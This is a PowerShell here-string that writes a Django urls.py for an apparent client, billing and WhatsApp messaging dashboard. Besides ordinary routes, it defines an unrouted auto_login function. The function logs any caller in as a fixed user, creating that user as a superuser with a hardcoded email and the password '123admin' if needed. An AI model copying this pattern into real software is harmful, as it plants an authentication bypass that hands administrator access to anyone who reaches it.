@'
from django.urls import path
from django.views.generic import TemplateView
from django.contrib.auth import login
from django.contrib.auth.models import User
from django.shortcuts import redirect
from . import views

def auto_login(request):
    try:
        user = User.objects.get(username=''mutinda'')
        login(request, user)
        return redirect(''/dashboard/'')
    except User.DoesNotExist:
        user = User.objects.create_user(''mutinda'', ''eminentwriters8@gmail.com'', ''123admin'')
        user.is_staff = True
        user.is_superuser = True
        user.save()
        login(request, user)
        return redirect(''/dashboard/'')

urlpatterns = [
    # Main Navigation
    path(''dashboard/'', TemplateView.as_view(template_name=''dashboard/main.html''), name=''main_dashboard''),
    
    # Client Management Section
    path(''clients/'', views.client_list, name=''client_list''),
    path(''clients/new/'', views.client_create, name=''client_create''),
    path(''clients/dashboard/'', views.client_dashboard, name=''client_dashboard''),
    
    # Network Monitor Section
    path(''network/'', views.network_dashboard, name=''network_main''),
    path(''network/dashboard/'', views.network_dashboard, name=''network_dashboard''),
    
    # Billing Section
    path(''billing/'', TemplateView.as_view(template_name=''billing/main.html''), name=''billing_main''),
    
    # Messaging Section
    path(''messaging/'', views.whatsapp_bulk_send, name=''messaging_main''),
    path(''messaging/compose/'', views.whatsapp_bulk_send, name=''whatsapp_compose''),
    path(''messaging/results/'', views.whatsapp_results, name=''whatsapp_results''),
    path(''messaging/reminders/'', views.whatsapp_payment_reminders, name=''whatsapp_reminders''),
    
    # Root redirect to main dashboard
    path('''', TemplateView.as_view(template_name=''dashboard/main.html''), name=''home''),
]
'@ | Set-Content clients\urls.py -Encoding UTF8